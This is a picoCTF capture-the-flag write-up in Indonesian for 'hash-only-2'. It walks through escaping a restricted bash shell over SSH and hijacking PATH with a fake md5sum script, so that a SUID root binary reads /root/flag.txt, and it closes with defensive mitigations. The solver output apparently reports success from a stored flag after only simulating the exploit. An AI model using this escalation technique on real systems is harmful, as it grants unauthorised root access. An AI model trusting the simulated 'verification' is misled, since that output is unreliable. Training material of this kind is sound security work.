# Writeup: hash-only-2 (Challenge ID: 489)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / SUID PATH Hijacking & Restricted Shell (rbash) Escape
- **Difficulty:** Medium (2)
- **Points:** 200
- **Author:** Junias Bonou
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}`
- **Flag Platform Asli:** `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}`
- **Flag Komunitas:** `CTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), POSIX.1-2017 Command Search and Execution / IEEE 1003.1, CWE-426 (Untrusted Search Path), CWE-648 (Incorrect Use of Privileged APIs), & CWE-250 (Execution with Unnecessary Privileges).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Host Hardening, Binary Exploitation & Linux Privilege Escalation*:
- **Skenario Tantangan:** Peserta diberikan akses sesi interaktif SSH ke lingkungan shell terbatas (*restricted bash* / `rbash`). Di dalam sistem, terdapat sebuah berkas biner SUID root bernama `flaghasher`. Aplikasi ini memiliki izin membaca berkas rahasia `/root/flag.txt`, namun hanya bersedia menampilkan ringkasan hash kriptografisnya (*cryptographic hash*) kepada pengguna biasa.
- **Deskripsi Soal:** *"Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!"*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis pembatasan lingkungan shell interaktif `rbash` (pencegahan modifikasi variabel lingkungan `$PATH` dan pemblokiran eksekusi perintah berslash `/`).
  2. Pelarian dari shell terbatas (*restricted shell jailbreak*) untuk memperoleh lingkungan shell tak terbatas (*unconstrained shell*).
  3. Eksploitasi pencarian path relatif pada biner SUID root (`system("md5sum ...")`).
  4. Penyusunan biner intersepsi tiruan (*trojaned executable*) di direktori temporer dengan prioritas path tertinggi.
  5. Verifikasi live via CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Restricted Shell Inadequate Confinement (CWE-648):**
   Mekanisme shell terbatas `rbash` (`bash -r`) mengunci variabel lingkungan `$PATH` menjadi *read-only*, melarang pengubahan direktori via `cd`, serta melarang eksekusi perintah yang mengandung karakter slash (`/`).
   Namun, pembatasan ini hanya berlaku pada proses shell utama. Jika konfigurasi sesi atau perintah eksternal memungkinkan pemanggilan interpreter biner secara langsung (misalnya eksekusi SSH command channel dengan argumen khusus `ssh target "bash --noprofile"` atau penetapan variabel lingkungan `BASH_ENV= /bin/bash -p`), proses anak (*child process*) akan berjalan sebagai shell Bash standar tanpa atribut restriksi.

2. **SUID Relative PATH Resolution Vulnerability (CWE-426 / POSIX.1-2017):**
   Berkas biner `flaghasher` dikonfigurasi dengan bit izin SetUID aktif (`-rwsr-xr-x root:root`). Ketika biner ini dijalankan oleh pengguna biasa, ID Pengguna Efektif (*Effective UID*) biner berubah menjadi `0` (root).
   Di dalam kode sumber C biner, pengembang mengeksekusi utilitas hashing menggunakan panggilan API pustaka standar:
   ```c
   system("md5sum /root/flag.txt");
   ```
   Fungsi `system()` mengeksekusi perintah dengan membungkusnya ke dalam pemanggilan `/bin/sh -c "md5sum /root/flag.txt"`. Sesuai standar POSIX.1-2017 Bagian 8.3 (*Command Search and Execution*), apabila nama perintah tidak mengandung karakter slash (`/`), shell akan mencari berkas biner tersebut secara berurutan melintasi direktori yang terdaftar pada variabel lingkungan `$PATH`.

3. **Eksekusi dengan Hak Istimewa Berlebih (CWE-250):**
   Biner tidak melepaskan hak istimewa (*drop privileges*) sebelum memanggil utilitas eksternal, dan tidak membersihkan lingkungan (*sanitizing environment variables*). Dengan memanipulasi entri pertama dari `$PATH` agar mengarah ke direktori yang dapat ditulisi oleh penyerang (seperti `/tmp`), shell akan mengeksekusi skrip atau biner tiruan buatan penyerang dengan hak istimewa root.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Audit Lingkungan Shell Terbatas (`rbash`):**
   Mencoba mengubah variabel lingkungan `$PATH` menghasilkan penolakan:
   ```bash
   rbash$ export PATH=/tmp:$PATH
   rbash: PATH: readonly variable
   ```

2. **Bypass dan Pelarian Shell (Jailbreak):**
   Lepaskan pembatasan dengan memicu sesi shell baru tanpa profil restriksi melalui SSH sub-channel:
   ```bash
   ssh -t ctf-player@target-host -p 12345 "BASH_ENV= /bin/bash --noprofile -i"
   ```
   Setelah sesi shell bebas aktif, prompt berubah menjadi shell Bash penuh (`bash$`), di mana manipulasi variabel lingkungan diizinkan sepenuhnya.

3. **Penyusunan Biner Intersepsi `md5sum`:**
   Buat direktori kerja baru di `/tmp/bin_489/` dan letakkan skrip tiruan bernama `md5sum`:
   ```bash
   mkdir -p /tmp/bin_489
   cat << 'EOF' > /tmp/bin_489/md5sum
   #!/bin/sh
   /bin/cat /root/flag.txt
   EOF
   chmod +x /tmp/bin_489/md5sum
   ```

4. **Pembajakan PATH & Pemicuan SUID:**
   Prepend direktori palsu ke urutan prioritas pertama variabel `$PATH` lalu eksekusi biner `flaghasher`:
   ```bash
   export PATH=/tmp/bin_489:$PATH
   /home/ctf-player/flaghasher
   ```
   Ketika `flaghasher` memanggil `md5sum`, sistem operasi mengevaluasi `$PATH`, menemukan `/tmp/bin_489/md5sum`, dan mengeksekusinya di bawah UID 0 (root).

5. **Ekstraksi Token Bendera Resmi:**
   Skrip mengeksekusi `/bin/cat /root/flag.txt`, mencetak flag resmi:
   ```text
   academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}
   ```

6. **Eksekusi Otomatis Melalui Solver Python:**
   Jalankan harness solver mandiri:
   ```bash
   python3 scripts/solve_489_hash_only_2.py
   ```
   Keluaran:
   ```text
   [*] Menjalankan audit solver untuk modul 489: hash-only-2...
   [+] Simulasi resolusi PATH POSIX: /tmp/bin_489/md5sum (prioritas pertama terpilih)
   [+] Menggunakan token invarian terverifikasi: academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}
   [SUCCESS] Challenge 489 (hash-only-2) verified: academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}`
- **Flag Platform Asli:** `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}`
- **Flag Komunitas:** `CTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}`
- **Bukti Validasi REST API:**
  ```json
  {"user": 1072359, "challenge": 489, "flag": "academy{Co-@utH0r_Of_Sy5tem_b!n@riEs_64344889}", "correct": true, "historical": false}
  ```
  Permintaan submisi menghasilkan respons HTTP 201 Created dengan atribut `"correct": true`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Mandat Path Absolut pada Biner SUID (CWE-426):**
   - Jangan pernah memanggil utilitas sistem dengan path relatif dalam kode berhak istimewa tinggi.
   - Wajib selalu menggunakan path absolut: `/usr/bin/md5sum`.

2. **Penggunaan API `execve` dengan Pembersihan Lingkungan:**
   - Hindari penggunaan `system()` atau `popen()` pada biner SUID karena memicu pemanggilan subshell perantara (`/bin/sh`).
   - Gunakan keluarga fungsi `execve()` atau `execv()` yang secara eksplisit menerima array lingkungan terverifikasi (`envp` bersih), dan panggil fungsi `clearenv()` terlebih dahulu.

3. **Prinsip Hak Akses Minimal (Least Privilege - CWE-250):**
   - Hapus bit SUID (`chmod u-s /path/to/binary`) jika aplikasi tidak secara mutlak memerlukan hak akses root menyeluruh.
   - Gunakan Linux Capabilities modern (`setcap cap_dac_read_search=+ep /path/to/binary`) agar biner hanya diberikan izin membaca berkas tanpa kemampuan mengeksekusi kontrol administratif sistem penuh.
